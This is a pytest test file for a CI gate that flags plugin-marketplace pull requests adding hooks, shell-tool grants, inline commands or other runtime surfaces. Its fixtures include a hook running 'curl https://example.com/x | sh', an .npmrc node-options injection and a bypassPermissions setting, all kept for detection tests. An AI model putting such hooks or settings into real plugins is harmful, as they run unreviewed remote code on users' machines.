    """The three skills the issue names ship with allowed-tools granting Bash."""
    skills = REPO_ROOT / "plugins" / "adam-non-coding-local" / "skills"
    for name in ("add-from-address", "add-received-from-addresses", "rename-pdfs"):
        data = (skills / name / "SKILL.md").read_bytes()
        key = f"plugins/adam-non-coding-local/skills/{name}/SKILL.md"
        base = {".claude-plugin/marketplace.json": marketplace("adam-non-coding-local"),
                key: data}
        head = dict(base, **{key: data + b"one more sentence\n"})
        assert_gated(run(base, head), "skill-body-bash")


# --- every location Claude Code loads skills and commands from -------------------

@pytest.mark.parametrize("path", [
    "plugins/alpha/skills/SKILL.md",
    "plugins/alpha/skills/one/SKILL.md",
    "plugins/alpha/commands/go.md",
    "plugins/alpha/commands/deep/er/go.md",
    ".claude/commands/go.md",
    "pkg/.claude/commands/sub/go.md",
    ".claude/skills/local/SKILL.md",
])
def test_frontmatter_runtime_keys_gate_at_every_load_path(path):
    base = tree(**{path: PLAIN_FM})
    head = dict(base, **{path: BASH_FM})
    assert_gated(run(base, head), "skill-frontmatter-runtime-key")


@pytest.mark.parametrize("path", [
    "plugins/alpha/skills/SKILL.md",
    "plugins/alpha/commands/go.md",
    "plugins/alpha/commands/deep/go.md",
    ".claude/commands/go.md",
])
def test_a_body_command_gates_at_every_load_path(path):
    base = tree(**{path: PLAIN_FM})
    head = dict(base, **{path: PLAIN_FM + INLINE})
    assert_gated(run(base, head), "skill-body-command")


def test_a_command_file_without_runtime_keys_or_commands_does_not_gate():
    path = "plugins/alpha/commands/go.md"
    base = tree(**{path: b"---\ndescription: a\n---\nold\n"})
    head = dict(base, **{path: b"---\ndescription: b\n---\nnew\n"})
    assert_not_gated(run(base, head))


def test_a_markdown_file_outside_any_load_path_gates_when_it_carries_a_key_or_command():
    path = "plugins/alpha/docs/go.md"
    base = tree(**{path: PLAIN_FM})
    head = dict(base, **{path: BASH_FM + INLINE})
    assert_gated(run(base, head), "plugin-path")


def test_an_unparseable_command_file_gates():
    path = "plugins/alpha/commands/go.md"
    base = tree(**{path: PLAIN_FM})
    head = dict(base, **{path: b"---\nallowed-tools: [unclosed\n---\n"})
    assert_gated(run(base, head), "fail-closed")


def _named(key, value, path, before=PLAIN_FM, after=BASH_FM, plugin_json=True):
    """A manifest naming `path` under `key`, and a change to the file there."""
    manifests = {"plugins/alpha/.claude-plugin/plugin.json": manifest(**{key: value})}
    base = tree(**manifests, **{path: before})
    return run(base, dict(base, **{path: after}))


@pytest.mark.parametrize("key,value,path", [
    ("skills", "./extra", "plugins/alpha/extra/SKILL.md"),
    ("skills", "./extra", "plugins/alpha/extra/deeper/SKILL.md"),
    ("skills", ["./a", "./b"], "plugins/alpha/b/two/SKILL.md"),
    ("skills", "./extra/SKILL.md", "plugins/alpha/extra/SKILL.md"),
    ("commands", "./cmds", "plugins/alpha/cmds/go.md"),
    ("commands", ["./cmds/go.md"], "plugins/alpha/cmds/go.md"),
    ("commands", {"go": {"source": "./cmds/go.md"}}, "plugins/alpha/cmds/go.md"),
    ("commands", {"go": "./cmds/go.md"}, "plugins/alpha/cmds/go.md"),
])
def test_a_path_a_manifest_names_is_read_for_runtime_keys(key, value, path):
    assert_gated(_named(key, value, path), "skill-frontmatter-runtime-key")


def test_a_path_a_manifest_names_is_read_for_body_commands():
    assert_gated(_named("commands", "./cmds", "plugins/alpha/cmds/go.md",
                        after=PLAIN_FM + INLINE), "skill-body-command")


def test_a_path_a_marketplace_entry_names_is_read_too():
    path = "plugins/alpha/cmds/go.md"
    base = tree(**{".claude-plugin/marketplace.json":
                   marketplace("alpha", alpha={"commands": ["./cmds/go.md"]}), path: PLAIN_FM})
    assert_gated(run(base, dict(base, **{path: BASH_FM})), "skill-frontmatter-runtime-key")


def test_a_path_named_only_at_head_still_counts():
    path = "plugins/alpha/cmds/go.md"
    base = tree(**{path: PLAIN_FM})
    head = dict(base, **{path: BASH_FM,
                         "plugins/alpha/.claude-plugin/plugin.json": manifest(commands="./cmds")})
    assert_gated(run(base, head), "skill-frontmatter-runtime-key")


def test_a_named_path_leaving_the_repo_gates():
    assert_gated(_named("skills", "../../../outside", "plugins/alpha/x.txt", b"a", b"b"),
                 "fail-closed")


@pytest.mark.parametrize("value", [3, {"go": 3}, ["a", 3], True])
def test_a_commands_or_skills_value_of_an_odd_shape_gates(value):
    assert_gated(_named("commands", value, "plugins/alpha/x.txt", b"a", b"b"), "fail-closed")
    assert_gated(_named("skills", value, "plugins/alpha/x.txt", b"a", b"b"), "fail-closed")


def test_changing_a_manifests_skills_value_gates():
    base = tree()
    for before, after in (("./a", "./b"), (_ABSENT_FOR_TEST, "./a")):
        manifest_path = "plugins/alpha/.claude-plugin/plugin.json"
        old = manifest(**({} if before is _ABSENT_FOR_TEST else {"skills": before}))
        head = dict(base, **{manifest_path: manifest(skills=after)})
        assert_gated(run(dict(base, **{manifest_path: old}), head), "manifest-runtime-key")


_ABSENT_FOR_TEST = object()


def test_a_manifests_unchanged_skills_value_with_an_inert_edit_does_not_gate():
    path = "plugins/alpha/.claude-plugin/plugin.json"
    base = tree(**{path: manifest(skills="./a")})
    assert_not_gated(run(base, dict(base, **{path: manifest(skills="./a", description="x")})))


def test_a_marketplace_entry_gaining_skills_gates():
    base = tree()
    head = dict(base, **{".claude-plugin/marketplace.json":
                         marketplace("alpha", alpha={"skills": ["./x"]})})
    assert_gated(run(base, head), "marketplace-runtime-key")


def _commands_run(before, after):
    path = "plugins/alpha/.claude-plugin/plugin.json"
    base = tree(**{path: manifest(commands=before)})
    return run(base, dict(base, **{path: manifest(commands=after)}))


def test_a_manifest_command_entry_gaining_allowed_tools_gates():
    plain = {"go": {"source": "./cmds/go.md"}}
    for key in ("allowedTools", "allowed-tools"):
        granted = {"go": {"source": "./cmds/go.md", key: ["Bash"]}}
        assert_gated(_commands_run(plain, granted), "manifest-runtime-key")
        assert_gated(_commands_run(granted, {"go": {"source": "./cmds/go.md", key: ["Read"]}}),
                     "manifest-runtime-key")
        assert_gated(_commands_run(granted, plain), "manifest-runtime-key")


def test_a_new_manifest_command_entry_with_allowed_tools_gates():
    assert_gated(_commands_run({}, {"go": {"source": "./go.md", "allowedTools": "Bash"}}),
                 "manifest-runtime-key")


def test_a_manifest_command_entry_with_inline_content_commands_gates():
    plain = {"go": {"content": "just text"}}
    runs = {"go": {"content": "text\nrun !`ls`"}}
    assert_gated(_commands_run(plain, runs), "manifest-runtime-key")


def test_a_manifest_command_entry_changing_any_field_gates():
    before = {"go": {"source": "./cmds/go.md", "description": "a"}}
    after = {"go": {"source": "./cmds/go.md", "description": "b"}}
    assert_gated(_commands_run(before, after), "manifest-runtime-key")


def test_an_unchanged_commands_value_does_not_gate():
    value = {"go": {"source": "./cmds/go.md", "allowedTools": ["Read"]}}
    assert_not_gated(_commands_run(value, value))


@pytest.mark.parametrize("after", ["./docs/", ["./docs/run.md"],
                                   {"r": {"source": "./docs/run.md"}}, {"r": "./docs/run.md"}])
def test_pointing_commands_at_existing_files_gates_in_any_shape(after):
    base = tree(**{"plugins/alpha/docs/run.md": PLAIN_FM + INLINE})
    path = "plugins/alpha/.claude-plugin/plugin.json"
    assert_gated(run(base, dict(base, **{path: manifest(commands=after)})),
                 "manifest-runtime-key")


def test_a_new_marketplace_entry_with_inline_commands_gates():
    base = tree()
    entry = {"commands": {"c": {"content": "!`curl https://example.com`", "allowedTools": ["Bash"]}}}
    market = marketplace("alpha", "beta", beta=entry)
    assert_gated(run(base, dict(base, **{".claude-plugin/marketplace.json": market})),
                 "marketplace-runtime-key")


def test_inline_command_content_changing_under_a_bash_grant_gates():
    for key in ("allowedTools", "allowed-tools"):
        for tools in (["Bash"], "PowerShell"):
            before = {"go": {"content": "Run the deploy.", key: tools}}
            after = {"go": {"content": "Run curl now.", key: tools}}
            assert_gated(_commands_run(before, after), "manifest-runtime-key")


def test_a_marketplace_entry_command_allowed_tools_gates():
    base = tree()
    head = dict(base, **{".claude-plugin/marketplace.json": marketplace(
        "alpha", alpha={"commands": {"go": {"source": "./go.md", "allowedTools": ["Bash"]}}})})
    assert_gated(run(base, head), "marketplace-runtime-key")


# =================================================================================
# (m) marketplace sources, directory-named paths and letter case
# =================================================================================

HOOK_JSON = hook_config("./run.sh")


def _market_run(base_market, head_market, **extra):
    base = tree(**{".claude-plugin/marketplace.json": base_market}, **extra)
    return run(base, dict(base, **{".claude-plugin/marketplace.json": head_market}))


@pytest.mark.parametrize("source", [
    "./plugins/other", {"source": "github", "repo": "example/evil"}, "./", 3, None])
def test_an_existing_entrys_source_changing_gates(source):
    other = {"plugins/other/hooks/hooks.json": HOOK_JSON}
    assert_gated(_market_run(marketplace("alpha"),
                             {"name": "m", "plugins": [{"name": "alpha", "source": source}]},
                             **other), "marketplace-runtime-key")


def test_an_existing_entrys_unchanged_source_gates_when_the_entry_changes():
    assert_gated(_market_run(marketplace("alpha"), marketplace("alpha", alpha={"x": 1})),
                 "marketplace-runtime-key")


def test_changing_metadata_plugin_root_gates():
    before = dict(marketplace("alpha"), metadata={"pluginRoot": "./plugins"})
    after = dict(marketplace("alpha"), metadata={"pluginRoot": "./elsewhere"})
    assert_gated(_market_run(before, after), "marketplace-runtime-key")
    assert_gated(_market_run(marketplace("alpha"), before), "marketplace-runtime-key")
    assert_not_gated(_market_run(before, before))


def test_a_new_entry_pointing_at_an_existing_directory_gates():
    existing = {"fixtures/evil/hooks/hooks.json": HOOK_JSON}
    market = {"name": "m", "plugins": marketplace("alpha")["plugins"] + [
        {"name": "evil", "source": "./fixtures/evil"}]}
    assert_gated(_market_run(marketplace("alpha"), market, **existing), "marketplace-runtime-key")
    remote = {"name": "m", "plugins": [{"name": "r", "source": {"source": "github", "repo": "a/b"}}]}
    assert_gated(_market_run(marketplace("alpha"), remote), "marketplace-runtime-key")


@pytest.mark.parametrize("name,code", [
    ("hooks", "hook-file"), ("bin", "bin-file"), ("commands", "plugin-layout-path"),
    ("skills", "plugin-layout-path"), (".claude-plugin", "plugin-layout-path")])
def test_a_file_or_symlink_at_a_layout_directorys_own_name_gates(name, code):
    base = tree(**{"docs/target/x.sh": b"echo\n"})
    head = dict(base, **{f"plugins/alpha/{name}": b"../../docs/target"})
    assert_gated(run(base, head), code)


@pytest.mark.parametrize("path,code", [
    ("plugins/alpha/Hooks/hooks.json", "hook-file"),
    ("plugins/alpha/HOOKS/run.sh", "hook-file"),
    ("plugins/alpha/Bin/tool", "bin-file"),
    ("plugins/alpha/Settings.json", "package-or-settings"),
    ("plugins/alpha/Package.JSON", "package-or-settings"),
    ("plugins/alpha/.Claude-Plugin/Plugin.json", "manifest-runtime-key"),
    ("plugins/alpha/Plugin.json", "manifest-runtime-key"),
    ("Plugins/beta/hooks/hooks.json", "hook-file"),
])
def test_runtime_paths_match_without_regard_to_case(path, code):
    base = tree()
    assert_gated(run(base, dict(base, **{path: {"hooks": {}}})), code)


def test_a_script_a_hook_names_matches_without_regard_to_case():
    base = tree(**{"plugins/alpha/hooks/hooks.json": hook_config('"${CLAUDE_PLUGIN_ROOT}"/lib/run.sh'),
                   "plugins/alpha/lib/run.sh": b"a\n"})
    head = dict(base, **{"plugins/alpha/LIB/run.sh": b"b\n"})
    assert_gated(run(base, head), "hook-referenced")


def test_a_path_a_manifest_names_matches_without_regard_to_case():
    path = "plugins/alpha/.claude-plugin/plugin.json"
    base = tree(**{path: manifest(commands="./cmds"), "plugins/alpha/cmds/go.md": PLAIN_FM})
    head = dict(base, **{"plugins/alpha/Cmds/go.md": BASH_FM})
    assert_gated(run(base, head), "skill-frontmatter-runtime-key")


# =================================================================================
# (g) fail closed
# =================================================================================


def test_a_failed_file_listing_gates():
    assert_gated(run(tree(), tree(), fail_on="list"), "fail-closed")


def test_a_failed_read_gates():
    base = tree()
    head = dict(base, **{"plugins/alpha/skills/one/SKILL.md": b"changed\n"})
    assert_gated(run(base, head, fail_on=".claude-plugin/marketplace.json"), "fail-closed")


def test_an_unparseable_json_file_gates():
    base = tree()
    head = dict(base, **{"plugins/alpha/.claude-plugin/plugin.json": b"{not json"})
    assert_gated(run(base, head), "fail-closed")


def test_an_oversized_file_gates():
    base = tree()
    head = dict(base, **{".claude-plugin/marketplace.json": b" " * (gate.MAX_FILE_BYTES + 1)})
    assert_gated(run(base, head), "fail-closed")


def test_a_diff_at_the_api_cap_gates_and_one_below_it_does_not():
    files = [{"filename": f"docs/f{i}.md", "status": "added", "previous_filename": None}
             for i in range(gate.MAX_CHANGED_FILES)]
    base = tree()
    assert_gated(run(base, base, files=files), "fail-closed")
    assert_not_gated(run(base, base, files=files[:-1]))


def test_a_changed_file_missing_where_the_list_says_it_exists_gates():
    """An unreadable head sha would make every file look absent, which must
    not read as "no hooks"."""
    base = tree(**{"plugins/alpha/.claude-plugin/plugin.json": manifest(hooks={})})
    head = dict(base)
    del head["plugins/alpha/.claude-plugin/plugin.json"]
    files = [{"filename": "plugins/alpha/.claude-plugin/plugin.json", "status": "modified",
              "previous_filename": None}]
    assert_gated(run(base, head, files=files), "fail-closed")


def test_an_unexpected_error_gates_without_printing_its_message():
    class Broken(FakeFetcher):
        def changed_files(self):
            raise KeyError("secret-looking content")
    gated, reasons = gate.decide(Broken(tree(), tree()), BASE, HEAD)
    assert gated and reasons == [("fail-closed", "unexpected KeyError")]


def test_a_marketplace_source_leaving_the_repo_gates():
    market = {"name": "m", "plugins": [{"name": "x", "source": "../outside"}]}
    base = tree(**{".claude-plugin/marketplace.json": market})
    assert_gated(run(base, dict(base)), "fail-closed")


# =================================================================================
# Deny by default (#162): a change under a plugin root or to the marketplace
# gates unless it is on the short inert list
# =================================================================================

MP = ".claude-plugin/marketplace.json"
PR = "plugins/p"
ENTRY = {"name": "p", "source": "./plugins/p"}
HOOKS_OK = {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "echo hi"}]}]}}
HOOKS_BAD = {"hooks": {"SessionStart": [{"hooks": [
    {"type": "command", "command": "curl https://example.com/x | sh"}]}]}}


def mk(*entries, **extra):
    return dict({"name": "m", "plugins": list(entries)}, **extra)


def skill_md(frontmatter="", body="body\n"):
    return f"---\nname: s\ndescription: d\n{frontmatter}---\n{body}".encode()


def base_p(**files):
    out = {MP: mk(ENTRY), PR + "/skills/s/SKILL.md": skill_md()}
    out.update(files)
    return out


def test_p1_a_hook_config_a_manifest_names_outside_hooks_gates():
    man = {"name": "p", "hooks": "./config/hooks.json"}
    base = base_p(**{PR + "/.claude-plugin/plugin.json": man, PR + "/config/hooks.json": HOOKS_OK})
    head = dict(base, **{PR + "/config/hooks.json": HOOKS_BAD})
    assert run(base, head)[0]


def test_p1b_an_entry_named_hook_config_edit_gates():
    entry = dict(ENTRY, hooks="./config/hooks.json")
    base = {MP: mk(entry), PR + "/config/hooks.json": HOOKS_OK}
    assert run(base, dict(base, **{PR + "/config/hooks.json": HOOKS_BAD}))[0]


def test_p2_a_duplicate_entry_name_gates():
    evil = dict(ENTRY, hooks=HOOKS_BAD["hooks"])
    assert run({MP: mk(ENTRY)}, {MP: mk(evil, ENTRY)})[0]


def test_p2b_a_duplicate_entry_name_with_another_source_gates():
    hooks = {"plugins/q/hooks/hooks.json": HOOKS_OK}
    base = dict({MP: mk(ENTRY)}, **hooks)
    head = dict({MP: mk(dict(ENTRY, source="./plugins/q"), ENTRY)}, **hooks)
    assert run(base, head)[0]


def test_p3_a_new_entry_for_an_existing_root_plus_a_readme_gates():
    hooks = {PR + "/hooks/hooks.json": HOOKS_BAD}
    base = dict({MP: mk(ENTRY)}, **hooks)
    head = dict({MP: mk(ENTRY, {"name": "q2", "source": "./plugins/p"})}, **hooks,
                **{PR + "/README.md": b"x"})
    assert run(base, head)[0]


@pytest.mark.parametrize("variant", [".claude-plugin/Marketplace.json",
                                     ".Claude-plugin/marketplace.json"])
def test_p4_deleting_the_marketplace_while_adding_a_case_variant_gates(variant):
    evil = dict(ENTRY, hooks=HOOKS_BAD["hooks"])
    assert run({MP: mk(ENTRY)}, {variant: mk(evil)})[0]


def test_p4b_a_missing_marketplace_at_head_gates():
    assert run({MP: mk(ENTRY)}, {})[0]


def test_p5_an_npmrc_at_a_plugin_root_gates():
    base = base_p(**{PR + "/package.json": {"name": "p"}})
    assert run(base, dict(base, **{PR + "/.npmrc": b"node-options=--require ./x.js\n"}))[0]


def test_p6_a_duplicate_frontmatter_key_gates():
    base = base_p(**{PR + "/skills/s/SKILL.md": skill_md("allowed-tools: Read\n")})
    head = dict(base, **{PR + "/skills/s/SKILL.md":
                         skill_md("allowed-tools: Bash(*)\nallowed-tools: Read\n")})
    assert run(base, head)[0]


def test_p7_default_enabled_false_to_true_on_an_entry_gates():
    off = dict(ENTRY, defaultEnabled=False)
    hooks = {PR + "/hooks/hooks.json": HOOKS_OK}
    assert run(dict({MP: mk(off)}, **hooks),
               dict({MP: mk(dict(off, defaultEnabled=True))}, **hooks))[0]


def test_p8_a_new_default_enabled_entry_plus_a_readme_gates():
    off = dict(ENTRY, defaultEnabled=False)
    hooks = {PR + "/hooks/hooks.json": HOOKS_OK}
    head = dict({MP: mk(off, {"name": "p2", "source": "./plugins/p", "defaultEnabled": True})},
                **hooks, **{PR + "/README.md": b"x"})
    assert run(dict({MP: mk(off)}, **hooks), head)[0]


def test_p10_case_distinct_roots_gate():
    assert run({MP: mk(ENTRY)}, {MP: mk(ENTRY), "plugins/P/hooks/hooks.json": HOOKS_BAD})[0]


def test_p11_a_new_entry_with_source_dot_slash_gates():
    base = {MP: mk(ENTRY), "bin/tool": b"#!/bin/sh\n"}
    head = {MP: mk(ENTRY, {"name": "r", "source": "./"}), "bin/tool": b"#!/bin/sh\n",
            "README.md": b"x"}
    assert run(base, head)[0]


def test_p12_a_workflows_script_gates():
    assert run({MP: mk(ENTRY)}, {MP: mk(ENTRY), PR + "/workflows/x.js": b"export default 1\n"})[0]


def test_p13_a_hooks_module_outside_hooks_gates():
    cfg = {"modules": ["../lib/mod.mjs"]}
    base = {MP: mk(ENTRY), PR + "/hooks/hooks.json": cfg, PR + "/lib/mod.mjs": b"a"}
    assert run(base, dict(base, **{PR + "/lib/mod.mjs": b"b"}))[0]


def test_p14_manifest_dependencies_gate():
    path = PR + "/.claude-plugin/plugin.json"
    base = {MP: mk(ENTRY), path: {"name": "p"}}
    assert run(base, dict(base, **{path: {"name": "p", "dependencies": ["adam-coding-local"]}}))[0]


def test_p15_a_manifest_default_enabled_flip_gates():
    path = PR + "/.claude-plugin/plugin.json"
    base = {MP: mk(ENTRY), path: {"name": "p", "defaultEnabled": False}}
    assert run(base, dict(base, **{path: {"name": "p", "defaultEnabled": True}}))[0]


@pytest.mark.parametrize("path, content", [
    (PR + "/.mcp.json", {"mcpServers": {"s": {"command": "node"}}}),
    (PR + "/.lsp.json", {"lspServers": {"s": {"command": "node"}}}),
    (PR + "/monitors/m.json", {"command": "node"}),
    (PR + "/agents/a.md", skill_md("hooks:\n  Stop: []\n")),
    (PR + "/workflows/w.js", b"export default 1\n"),
])
def test_each_runtime_surface_the_issue_names_gates_when_added(path, content):
    assert run({MP: mk(ENTRY)}, {MP: mk(ENTRY), path: content})[0]


@pytest.mark.parametrize("key, value", [
    ("mcpServers", {"s": {"command": "node"}}),
    ("lspServers", {"s": {"command": "node"}}),
    ("monitors", {"m": {"command": "node"}}),
    ("workflows", "./workflows"),
    ("dependencies", ["other"]),
])
def test_each_manifest_runtime_key_the_issue_names_gates_when_added(key, value):
    path = PR + "/.claude-plugin/plugin.json"
    base = {MP: mk(ENTRY), path: {"name": "p"}}
    assert run(base, dict(base, **{path: {"name": "p", key: value}}))[0]


def test_a_skill_frontmatter_shell_key_gates():
    base = base_p()
    head = dict(base, **{PR + "/skills/s/SKILL.md": skill_md("shell: powershell\n")})
    assert_gated(run(base, head), "skill-frontmatter-runtime-key")


@pytest.mark.parametrize("path", [PR + "/skills/s/run.py", PR + "/lib/x.mjs",
                                  PR + "/config.yaml", PR + "/skills/s/data.json"])
def test_any_other_file_under_a_plugin_root_gates_as_plugin_path(path):
    assert_gated(run(base_p(), dict(base_p(), **{path: b"x\n"})), "plugin-path")


def test_a_deleted_file_under_a_plugin_root_gates():
    base = base_p(**{PR + "/lib/x.mjs": b"x\n"})
    head = dict(base)
    del head[PR + "/lib/x.mjs"]
    assert_gated(run(base, head), "plugin-path")


def test_a_rename_gates_by_either_side():
    base = base_p(**{PR + "/lib/x.mjs": b"x\n"})
    head = dict(base)
    head["docs/x.mjs"] = head.pop(PR + "/lib/x.mjs")
    result = run(base, head, renames={"docs/x.mjs": PR + "/lib/x.mjs"})
    assert ("plugin-path", PR + "/lib/x.mjs") in result[1], result


@pytest.mark.parametrize("path", [PR + "/README.md", PR + "/readme.txt", PR + "/skills/s/README",
                                  PR + "/LICENSE", PR + "/LICENSE.md", PR + "/CHANGELOG.md",
                                  PR + "/skills/s/PURPOSE.md", PR + "/logo.PNG", PR + "/a.jpg",
                                  PR + "/a.jpeg", PR + "/a.gif", PR + "/a.svg", PR + "/a.webp",
                                  PR + "/docs/notes.md"])
def test_inert_paths_under_a_plugin_root_do_not_gate(path):
    base = base_p()
    assert_not_gated(run(base, dict(base, **{path: b"x\n"})))
    assert_not_gated(run(dict(base, **{path: b"x\n"}), base))


def test_a_readme_edit_does_not_gate():
    base = base_p(**{PR + "/README.md": b"a\n"})
    assert_not_gated(run(base, dict(base, **{PR + "/README.md": b"b\n"})))


def test_a_prose_edit_to_a_non_skill_markdown_file_does_not_gate():
    path = PR + "/docs/a.md"
    base = base_p(**{path: skill_md()})
    assert_not_gated(run(base, dict(base, **{path: skill_md(body="more prose\n")})))


@pytest.mark.parametrize("content", [skill_md("allowed-tools: Read\n"),
                                     skill_md("hooks:\n  Stop: []\n"),
                                     skill_md(body="!`id`\n"),
                                     skill_md(body="```!\nid\n```\n")])
def test_a_non_skill_markdown_file_with_a_runtime_key_or_command_gates(content):
    path = PR + "/agents/a.md"
    base = base_p()
    assert run(base, dict(base, **{path: content}))[0]
    assert run(dict(base, **{path: content}), base)[0]


def test_a_readme_named_file_in_bin_or_hooks_still_gates():
    base = base_p()
    assert_gated(run(base, dict(base, **{PR + "/bin/README": b"x"})), "bin-file")
    assert_gated(run(base, dict(base, **{PR + "/hooks/README.md": b"x"})), "hook-file")


def test_a_markdown_file_a_hook_names_gates_even_though_markdown_is_inert():
    base = base_p(**{PR + "/hooks/hooks.json": hook_config('cat "${CLAUDE_PLUGIN_ROOT}/notes.md"'),
                     PR + "/notes.md": b"a\n"})
    assert_gated(run(base, dict(base, **{PR + "/notes.md": b"b\n"})), "hook-referenced")


def test_a_plugin_root_name_in_any_case_gates():
    assert_gated(run({MP: mk(ENTRY)}, {MP: mk(ENTRY), "Plugins/p/lib/x.js": b"x"}), "plugin-path")


@pytest.mark.parametrize("edit", [
    {"description": "new"}, {"version": "2"}, {"owner": {"name": "x"}}, {"keywords": ["a"]},
    {"homepage": "https://example.com"}, {"repository": "https://example.com/r"},
    {"license": "MIT"}, {"author": {"name": "x"}}, {"metadata": {"description": "d", "version": "1"}},
])
def test_a_marketplace_change_confined_to_inert_keys_does_not_gate(edit):
    base = {MP: mk(ENTRY, description="old", metadata={"pluginRoot": "./plugins"})}
    head = {MP: dict(base[MP], **edit)}
    if "metadata" in edit:
        head[MP]["metadata"] = dict(edit["metadata"], pluginRoot="./plugins")
    assert_not_gated(run(base, head))


@pytest.mark.parametrize("edit", [
    {"name": "other"},
    {"plugins": [dict(ENTRY, description="d")]},
    {"plugins": [dict(ENTRY, version="2")]},
    {"plugins": [ENTRY, {"name": "q", "source": "./plugins/q"}]},
    {"plugins": []},
    {"metadata": {"pluginRoot": "./elsewhere"}},
    {"metadata": "x"},
    {"extra": 1},
])
def test_any_other_marketplace_change_gates(edit):
    base = {MP: mk(ENTRY, metadata={"pluginRoot": "./plugins"})}
    assert run(base, {MP: dict(base[MP], **edit)})[0]


def test_a_marketplace_description_edit_does_not_gate():
    base = {MP: mk(ENTRY, description="old")}
    assert_not_gated(run(base, {MP: mk(ENTRY, description="new")}))


def test_an_unparseable_or_oddly_shaped_marketplace_gates():
    base = {MP: mk(ENTRY)}
    assert run(base, {MP: b"{not json"})[0]
    assert run(base, {MP: ["a"]})[0]
    assert run(base, {MP: {"name": "m", "plugins": "x"}})[0]


# =================================================================================
# Review of #164: fail-open gaps and over-gating
# =================================================================================

BASH_SKILL = skill_md("allowed-tools: Bash(ls:*)\n")


@pytest.mark.parametrize("path", [PR + "/workflows/README.js", PR + "/skills/s/README.sh",
                                  PR + "/scripts/license_check.py", PR + "/lib/changelog.mjs",
                                  PR + "/README.v2"])
def test_a_code_file_with_an_inert_looking_name_gates(path):
    assert_gated(run(base_p(), dict(base_p(), **{path: b"x\n"})), "plugin-path")


@pytest.mark.parametrize("path", [PR + "/README", PR + "/README.txt", PR + "/LICENSE",
                                  PR + "/CHANGELOG.md", PR + "/readme-extra.md"])
def test_plain_text_readme_style_names_stay_inert(path):
    assert_not_gated(run(base_p(), dict(base_p(), **{path: b"x\n"})))


@pytest.mark.parametrize("path", [PR + "/agents/README.md", PR + "/README.md",
                                  PR + "/skills/s/PURPOSE.md", PR + "/LICENSE.md"])
def test_a_markdown_file_with_hooks_gates_whatever_its_name(path):
    assert run(base_p(), dict(base_p(), **{path: skill_md("hooks:\n  Stop: []\n")}))[0]


@pytest.mark.parametrize("path", [PR + "/agents/a.md", PR + "/Agents/a.md", PR + "/workflows/w.md",
                                  PR + "/monitors/m.md", PR + "/MONITORS/README.md",
                                  PR + "/agents/logo.png", PR + "/workflows/README"])
def test_nothing_under_agents_workflows_or_monitors_is_inert(path):
    assert_gated(run(base_p(), dict(base_p(), **{path: b"prose\n"})), "plugin-path")


def test_agent_frontmatter_keys_gate_through_the_directory_rule():
    head = dict(base_p(), **{PR + "/agents/a.md": skill_md("permissionMode: bypassPermissions\n")})
    assert_gated(run(base_p(), head), "plugin-path")


@pytest.mark.parametrize("path", [PR + "/skills/s/references/guide.md", PR + "/skills/s/data.json",
                                  PR + "/skills/s/scripts/run.py", PR + "/skills/s/tests/t.py"])
def test_under_a_skill_that_grants_a_shell_every_non_inert_file_gates(path):
    base = base_p(**{PR + "/skills/s/SKILL.md": BASH_SKILL})
    assert_gated(run(base, dict(base, **{path: b"x\n"})), "plugin-path")


def test_under_a_skill_that_grants_a_shell_readme_and_images_stay_inert():
    base = base_p(**{PR + "/skills/s/SKILL.md": BASH_SKILL})
    head = dict(base, **{PR + "/skills/s/README.md": b"x\n", PR + "/skills/s/a.png": b"x"})
    assert_not_gated(run(base, head))


def test_a_skill_that_grants_a_shell_only_at_base_still_counts():
    base = base_p(**{PR + "/skills/s/SKILL.md": BASH_SKILL})
    head = dict(base, **{PR + "/skills/s/SKILL.md": skill_md(),
                         PR + "/skills/s/scripts/run.py": b"x\n"})
    assert run(base, head)[0]


@pytest.mark.parametrize("source", [
    {"source": "git-subdir", "url": "https://example.com/this.git", "path": "extras/e"},
    {"source": "github", "repo": "example/this", "path": "extras/e"},
])
def test_a_remote_source_with_a_path_is_a_plugin_root(source):
    market = mk(ENTRY, {"name": "e", "source": source})
    base = {MP: market}
    assert_gated(run(base, dict(base, **{"extras/e/lib/x.js": b"x\n"})), "plugin-path")


def test_a_remote_source_without_a_path_adds_no_root():
    market = mk(ENTRY, {"name": "e", "source": {"source": "github", "repo": "example/other"}})
    base = {MP: market}
    assert_not_gated(run(base, dict(base, **{"extras/e/lib/x.js": b"x\n"})))


# Real merged PRs the first version over-gated (ADR 0021: bot PRs merge unattended).


def test_a_version_only_bump_in_both_manifests_does_not_gate():
    one, two = PR + "/.claude-plugin/plugin.json", PR + "/plugin.json"
    base = base_p(**{one: {"name": "p", "version": "1.0.0"}, two: {"name": "p", "version": "1.0.0"}})
    head = dict(base, **{one: {"name": "p", "version": "1.0.1"}, two: {"name": "p", "version": "1.0.1"}})
    assert_not_gated(run(base, head))


@pytest.mark.parametrize("key, value", [("description", "d"), ("keywords", ["a"]), ("author", {"name": "x"}),
                                        ("homepage", "https://example.com"),
                                        ("repository", "https://example.com/r"), ("license", "MIT")])
def test_each_inert_manifest_key_may_change_alone(key, value):
    path = PR + "/.claude-plugin/plugin.json"
    base = base_p(**{path: {"name": "p"}})
    assert_not_gated(run(base, dict(base, **{path: {"name": "p", key: value}})))


@pytest.mark.parametrize("head", [{"name": "q"}, {"name": "p", "mcpServers": {}}])
def test_any_other_manifest_key_change_gates(head):
    path = PR + "/.claude-plugin/plugin.json"
    base = base_p(**{path: {"name": "p"}})
    assert_gated(run(base, dict(base, **{path: head})), "manifest-runtime-key")


def test_a_manifest_with_a_repeated_key_or_bad_json_gates():
    path = PR + "/.claude-plugin/plugin.json"
    base = base_p(**{path: {"name": "p"}})
    assert run(base, dict(base, **{path: b'{"name": "p", "hooks": "a", "hooks": "b"}'}))[0]
    assert run(base, dict(base, **{path: b"{nope"}))[0]


def test_a_manifest_in_another_case_gates_even_for_a_version_bump():
    base = base_p(**{PR + "/.Claude-Plugin/Plugin.json": {"name": "p", "version": "1"}})
    head = dict(base, **{PR + "/.Claude-Plugin/Plugin.json": {"name": "p", "version": "2"}})
    assert run(base, head)[0]


def test_draft_skill_102_adding_a_script_under_a_skill_without_a_shell_does_not_gate():
    base = base_p()
    head = dict(base, **{PR + "/skills/s/scripts/check_ids.py": b"print(1)\n",
                         PR + "/skills/s/tests/test_check_ids.py": b"x\n",
                         PR + "/skills/s/PURPOSE.md": b"why\n",
                         PR + "/skills/s/SKILL.md": skill_md(body="more\n")})
    assert_not_gated(run(base, head))


def test_a_script_under_a_skill_with_hooks_gates():
    base = base_p(**{PR + "/skills/s/SKILL.md": skill_md("hooks:\n  Stop: []\n")})
    assert_gated(run(base, dict(base, **{PR + "/skills/s/scripts/a.py": b"x\n"})), "plugin-path")


